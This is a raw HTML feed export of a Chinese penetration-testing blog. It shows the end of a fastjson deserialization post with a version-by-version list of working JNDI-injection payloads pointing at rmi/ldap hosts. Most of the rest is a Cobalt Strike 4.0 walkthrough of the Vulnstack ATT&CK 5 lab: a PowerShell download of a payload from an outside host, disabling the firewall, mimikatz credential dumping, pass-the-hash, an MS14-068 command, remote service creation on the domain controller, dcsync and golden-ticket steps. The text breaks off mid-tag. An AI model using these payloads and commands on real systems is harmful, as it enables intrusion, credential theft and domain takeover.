src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxNjMxNTAucG5n?x-oss-process=image/format,png" alt=""></p><p>POC:</p><p>要嵌套在里面zeo里面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:0</span><br></pre></td></tr></table></figure><h1 id="0x07-多版本payload集合"><a href="#0x07-多版本payload集合" class="headerlink" title="0x07 多版本payload集合"></a>0x07 多版本payload集合</h1><p>影响版本：</p><h3 id="fastjson-lt-1-2-24"><a href="#fastjson-lt-1-2-24" class="headerlink" title="fastjson&lt;=1.2.24"></a>fastjson&lt;=1.2.24</h3><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;x.x.x.x:1099&#x2F;jndi&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>影响版本：</p><h3 id="fastjson-lt-1-2-41"><a href="#fastjson-lt-1-2-41" class="headerlink" title="fastjson&lt;=1.2.41"></a>fastjson&lt;=1.2.41</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;x.x.x.x:1098&#x2F;jndi&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>影响版本：</p><h3 id="fastjson-lt-1-2-42"><a href="#fastjson-lt-1-2-42" class="headerlink" title="fastjson&lt;=1.2.42"></a>fastjson&lt;=1.2.42</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1399&#x2F;Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>影响版本：</p><h3 id="fastjson-lt-1-2-43"><a href="#fastjson-lt-1-2-43" class="headerlink" title="fastjson&lt;=1.2.43"></a>fastjson&lt;=1.2.43</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1399&#x2F;Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>影响版本：</p><h3 id="fastjson-lt-1-2-45"><a href="#fastjson-lt-1-2-45" class="headerlink" title="fastjson&lt;=1.2.45"></a>fastjson&lt;=1.2.45</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:&#123;&quot;data_source&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1399&#x2F;Exploit&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>影响版本：</p><h3 id="fastjson-lt-1-2-47"><a href="#fastjson-lt-1-2-47" class="headerlink" title="fastjson&lt;=1.2.47"></a>fastjson&lt;=1.2.47</h3><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.Class&quot;, </span><br><span class="line">        &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;, </span><br><span class="line">    &quot;b&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, </span><br><span class="line">        &quot;dataSourceName&quot;: &quot;ldap:&#x2F;&#x2F;x.x.x.x:1999&#x2F;Exploit&quot;, </span><br><span class="line">        &quot;autoCommit&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>影响版本：</p><h3 id="fastjson-lt-1-2-62"><a href="#fastjson-lt-1-2-62" class="headerlink" title="fastjson&lt;=1.2.62"></a>fastjson&lt;=1.2.62</h3><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;AsText&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1098&#x2F;exploit&quot;&#125;&quot;</span><br></pre></td></tr></table></figure><p>影响版本：</p><h3 id="fastjson-lt-1-2-66"><a href="#fastjson-lt-1-2-66" class="headerlink" title="fastjson&lt;=1.2.66"></a>fastjson&lt;=1.2.66</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap:&#x2F;&#x2F;192.168.80.1:1389&#x2F;Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap:&#x2F;&#x2F;192.168.80.1:1389&#x2F;Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,&quot;jndiNames&quot;:&quot;ldap:&#x2F;&#x2F;192.168.80.1:1389&#x2F;Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;: &#123;&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransaction&quot;:&quot;ldap:&#x2F;&#x2F;192.168.80.1:1399&#x2F;Calc&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内网中CobaltStrike4.0（CS4）的渗透之旅</title>
      <link href="/2020/07/02/%E5%86%85%E7%BD%91%E4%B8%ADCobaltStrike4.0%EF%BC%88CS4%EF%BC%89%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85/"/>
      <url>/2020/07/02/%E5%86%85%E7%BD%91%E4%B8%ADCobaltStrike4.0%EF%BC%88CS4%EF%BC%89%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是老以前做的一个，主要熟悉一下cs4的新特性，还是发出来看看吧，流程简单一些，但是内网流程还是比较完整的。大家可以看看</p><ul><li>本次靶机为红日安全的ATT&amp;CK第五个靶场。</li><li><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/7/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/7/</a></li><li>思路参考 <strong>记一次在Vulnstack ATT&amp;CK 5 靶场中使用CobaltStrike的渗透之旅</strong></li><li>文章中如有错误的地方望大佬指正。</li><li>菜鸡文章望大佬勿喷。</li></ul><h1 id="0x00信息收集"><a href="#0x00信息收集" class="headerlink" title="0x00信息收集"></a>0x00信息收集</h1><p>Namp 扫一下</p><p>发现 80 3306</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDIxMDAzNTcucG5n?x-oss-process=image/format,png" alt="image-20200326201051940"></p><p>访问一下发现thinkphp5 记得是有rce的</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDIxMDAzNTgucG5n?x-oss-process=image/format,png" alt="image-20200326201233266"></p><p>searchsploit thinkphp</p><p>有货</p><h1 id="0x00入口权限获取"><a href="#0x00入口权限获取" class="headerlink" title="0x00入口权限获取"></a>0x00入口权限获取</h1><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100359.png" alt="image-20200326201527710"></p><p>cool可以用</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDIxMDA0MDAucG5n?x-oss-process=image/format,png" alt="image-20200326202900905"></p><p>上传的姿势太多了，我就使用一个最简单的</p><p>使用powershell 下载 CS payload</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">powershell (<span class="keyword">new</span>-<span class="keyword">object</span> Net.WebClient).DownloadFile(<span class="string">'http://192.168.203.140/a.ps1'</span>,<span class="string">'C:\phpstudy_pro\WWW\a.ps1'</span>)</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">推荐可以直接放到C:\\Windows\\Temp\\里面</span><br><span class="line">C:\\Windows\\Temp\\payload.exe</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100401.png" alt="image-20200326210649920"></p><p>运行 直接上线 调整 sleep 1</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100402.png" alt="image-20200326210928665"></p><h1 id="0x01-提权"><a href="#0x01-提权" class="headerlink" title="0x01 提权"></a>0x01 提权</h1><p>权限比较低，需要提权</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100403.png" alt="image-20200326212306328"></p><p>我生成了一个名为<code>Priv Esc</code>的<code>listener</code>（<strong>payload:tcp beacon</strong>）（建议勾选<strong>Bind to localhost only</strong>）</p><p>为什么要勾选呢？作者的话：（反正就是勾选就对了）</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100404.png" alt="image-20200326214136126"></p><h4 id="svc-exe"><a href="#svc-exe" class="headerlink" title="svc-exe"></a>svc-exe</h4><p><code>svc-exe</code>这个参数，并不是和<code>exp</code>提权那样，帮你从普通用户 ”pwn！！“ 一下子拿下系统，而是当管理员权限满足不了你的时候，可以用<code>svc-exe</code>进行提升（类似<code>getsystem</code>命令，但是<code>getsystem</code>不太好使）</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDIxMDA0MDUucG5n?x-oss-process=image/format,png" alt="image-20200326214328389"></p><p>evelate svc-exe</p><p>提权成功</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDIxMDA0MDYucG5n?x-oss-process=image/format,png" alt="image-20200326214552334"></p><h1 id="0x02-横向移动"><a href="#0x02-横向移动" class="headerlink" title="0x02 横向移动"></a>0x02 横向移动</h1><p>切换到高权限用户</p><p>通过 explore-Process List 先查看一下进程，看看有没有杀毒软件</p><p>？？？</p><p>这个靶机怎么可能有？但是流程还是要走一下的</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100407.png" alt="image-20200326223213666"></p><h3 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h3><p>使用命令 netsh advfirewall set allprofiles state off 关闭防火墙</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100408.png" alt="image-20200326223531572"></p><h3 id="内网的信息搜集"><a href="#内网的信息搜集" class="headerlink" title="内网的信息搜集"></a>内网的信息搜集</h3><p>网段的端口扫描，得来一下意思意思吧</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100409.png" alt="image-20200328161638642"></p><p>然后查看域的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view &#x2F;domain</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100410.png" alt="image-20200326223828278"></p><p>还可以用cs4的新增命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net domain</span><br><span class="line">net domain_controllers</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100411.png" alt="image-20200327095731157"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">老方法</span><br><span class="line">run net config workstation</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100412.png" alt="image-20200326225030947"></p><p>工作站域是 sun.com</p><p>可现在登录域是 win7</p><p><strong>因此我们需要一个域用户的进程来进行信息搜集</strong></p><h3 id="我们需要一个域用户"><a href="#我们需要一个域用户" class="headerlink" title="我们需要一个域用户"></a>我们需要一个域用户</h3><p>先调用 Logonpasswords 抓一波密码</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100413.png" alt="image-20200326232857399"></p><p>还可以直观的看一下view- credentials</p><p>(因为是靶机，你最好把win7 的账户都登陆一下，否则只能抓到一个账户)</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDIxMDA0MTQucG5n?x-oss-process=image/format,png" alt="image-20200326233306356"></p><p>那我们拿到了这些凭据如何去调用他们呢?</p><p>切换回 本地管理员的beacon上 使用凭证有三种方法</p><ul><li>第一种:使用make_token去调用</li><li>第二种:使用pth命令生成一个新的进程注入进去</li><li>第三种:使用spawn as</li></ul><h3 id="第一种-Make-token"><a href="#第一种-Make-token" class="headerlink" title="第一种:Make_token"></a>第一种:Make_token</h3><p>Make_token是在当前的 beacon 上进行身份伪造<br>在当前beacon上，您的权限、权限或标识没有变化。但是，当您与远程资源交互时，使用的是您<br>伪造的身份.</p><p>先本地测试试命令,这个命令本地用户是用不了的，所以我们make_token一个域用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group “domain admins” &#x2F;domain</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDIxMDA0MTUucG5n?x-oss-process=image/format,png" alt="image-20200327154254921"></p><p>有之前抓取的密码 域用户 leo 123.com</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make_token SUN.COM&#x2F;leo 123.com</span><br><span class="line"></span><br><span class="line">#  注意域是SUN  要写成SUN.COM 才可以</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100416.png" alt="image-20200327155758470"></p><h3 id="第二种-使用pth命令生成一个新的进程注入进去"><a href="#第二种-使用pth命令生成一个新的进程注入进去" class="headerlink" title="第二种:使用pth命令生成一个新的进程注入进去"></a>第二种:使用pth命令生成一个新的进程注入进去</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pth SUN.COM\leo NTMLhash</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100417.png" alt="image-20200327162629958"> <img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100418.png" alt="image-20200327163003948"></p><p>找到PID</p><p>然后steal_token PID 成功执行域命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steal_token 3860</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDIxMDA0MTkucG5n?x-oss-process=image/format,png" alt="image-20200327163217871"></p><h3 id="第三种-使用spawn-as"><a href="#第三种-使用spawn-as" class="headerlink" title="第三种:使用spawn as"></a>第三种:使用spawn as</h3><p>spawnas 命令生成具有其他用户凭据的 beacon</p><p>用图形化不香吗？</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDIxMDA0MjAucG5n?x-oss-process=image/format,png" alt="image-20200327163723794"></p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100421.png" alt="image-20200327163840163"> <img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100422.png" alt="image-20200327164306023"></p><p>或者命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spawnas SUN.COM&#x2F;leo 123.com</span><br></pre></td></tr></table></figure><h3 id="第四中-进程注入到域用户的进程中，但必须得是-高权用户"><a href="#第四中-进程注入到域用户的进程中，但必须得是-高权用户" class="headerlink" title="第四中 进程注入到域用户的进程中，但必须得是 高权用户"></a>第四中 进程注入到域用户的进程中，但必须得是 高权用户</h3><p>那我使用system权限进入，找到域用户进程</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDIxMDA0MjMucG5n?x-oss-process=image/format,png" alt="image-20200327172102489"></p><p>就会多出来一个用户的beacon，成功</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100424.png" alt="image-20200327172157356"></p><h1 id="0x03-域内信息收集"><a href="#0x03-域内信息收集" class="headerlink" title="0x03 域内信息收集"></a>0x03 域内信息收集</h1><p>有了域用户，那么就可以在域内收集信息</p><p>方法太多了，我只简单的介绍CS里面东西</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net view</span><br><span class="line">net view sun</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100425.png" alt="image-20200327172649479"></p><p>查看信任域</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100426.png" alt="image-20200327174110848"></p><p>查看域内计算机</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100427.png" alt="image-20200327175106085"></p><p>查看域控</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net dclist sun</span><br><span class="line"></span><br><span class="line">这是输入sun域就可以，不用 sun.com</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDIxMDA0MjgucG5n?x-oss-process=image/format,png" alt="image-20200327175950669"></p><p>查看域管理员</p><p>Net group \\sun.com domain admin</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100429.png" alt="image-20200327175654595"></p><p>查看所有用户</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100430.png" alt="image-20200327175842362"></p><p>看下sid</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100431.png" alt="image-20200327180720472"></p><p>信息汇总</p><p>域管理员默认没有。。。因为我们还要提权操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">域名：sun.com</span><br><span class="line">域管理员：sun\administrator</span><br><span class="line">域用户：administrator，admin，leo和一个krbtgt</span><br><span class="line">域控：DC</span><br><span class="line">域成员：DC，Win7</span><br><span class="line">域控ip：192.168.138.138</span><br><span class="line">用户sid：S-1-5-21-3388020223-1982701712-4030140183-1110</span><br><span class="line">域sid：S-1-5-21-3388020223-1982701712-4030140183</span><br><span class="line">已知凭据：sun\leo:123.com，win7\heart:123.com</span><br></pre></td></tr></table></figure><h3 id="域提权"><a href="#域提权" class="headerlink" title="域提权"></a>域提权</h3><p>我们利用之前所收集到的信息进行域提权的操作<br>只能上 ms14-068 域提权一波了</p><p>先上传exp</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100432.png" alt="image-20200327214328684"></p><p>生成伪造缓存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell MS14-068.exe -u leo\@sun.com -p 123.com -s S-1-5-21-3388020223-1982701712-4030140183-1110 -d 192.168.138.138</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100433.png" alt="image-20200327214251809"></p><p>此时会生成TGT_leo@sun.com.ccache的伪造缓存文件。</p><p><code>mimikatz kerberos::purge</code> 清空当前机器中所有凭证</p><p><code>mimikatz kerberos::list</code> 查看当前机器凭证</p><p>导入伪造缓存前面</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100434.png" alt="image-20200327214615296"></p><p>用mimikaze</p><p><code>mimikatz kerberos::ptc TGT_leo\@sun.com.ccache</code> 将票据注入到内存中</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100435.png" alt="image-20200327215045968"></p><p>成功提取，读取到了数据</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100436.png" alt="image-20200327215118510"></p><h1 id="0x04横向到域控"><a href="#0x04横向到域控" class="headerlink" title="0x04横向到域控"></a>0x04横向到域控</h1><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100437.png" alt="image-20200327220257321"> <img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100438.png" alt="image-20200327220438029"></p><p>拿下DC</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100439.png" alt="image-20200327221244226"></p><p>反向beacon连接</p><p>先建立一个listener</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100440.png" alt="image-20200327223051295"> <img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100441.png" alt="image-20200327223240172"></p><p>生成一个生成一个 stageless payload ，这里选用的是服务exe</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100442.png" alt="image-20200327223416979"></p><p>选取刚刚的listener</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100443.png" alt="image-20200327223647279"></p><p>生成exe</p><p>我起名叫godc.exe</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">然后访问</span><br><span class="line">\\DC\\C$</span><br><span class="line"></span><br><span class="line">upload 上传payload</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100444.png" alt="image-20200327223943767"></p><p>加入注册表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">主要这里有个坑</span><br><span class="line">1 是\\ &#x2F; 这俩要分清</span><br><span class="line">2 还有就是 binpath&#x3D; “C:&#x2F;&#x2F;”  这尼玛中间有个空格一定不能省略！！！！</span><br><span class="line">binpath&#x3D;空格“C:&#x2F;&#x2F;”</span><br><span class="line"></span><br><span class="line">run sc \\DC create godc binpath&#x3D; &quot;C:&#x2F;godc.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100445.png" alt="image-20200327225802945"></p><p>启动服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run sc \\DC start godc</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100446.png" alt="image-20200327231414966"></p><p>机子也是反向链接回来的，注意箭头</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100447.png" alt="image-20200327232435244"></p><p>在内网环境中可以使用ipc $生成的SMB Beacon上传到目标主机执行，但是目标主机并不会直接上线的，需要我们自己用链接命令(link )去连接他。</p><p>link操作 只能是smb beacon</p><p>所以Leo那个是tcp的不能link操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">也要先调用凭据，远程命令执行</span><br><span class="line">关闭防火墙</span><br><span class="line"></span><br><span class="line">remote-exec wmi DC netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><h1 id="0x05-权限维持"><a href="#0x05-权限维持" class="headerlink" title="0x05 权限维持"></a>0x05 权限维持</h1><p>黄金票据(golden ticket)</p><p>1、首先我们需要先利用 logonpasswords 抓一波明文(在名为DC的Beacon进行操作)</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100448.png" alt="image-20200327234654469"></p><p>2、使用 dcsync 命令导出 krbtgt 的NTLM Hash</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100449.png" alt="image-20200327235127313"></p><p>或者，使用 hashdump 也可以导出hash</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100450.png" alt="image-20200328000516193"></p><p>到手</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100451.png" alt="image-20200328000458986"></p><p>3、为了方便于实践黄金票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">找一个低权限的用户 ls \\DC\C$</span><br><span class="line">要进行对比</span><br></pre></td></tr></table></figure><p><img 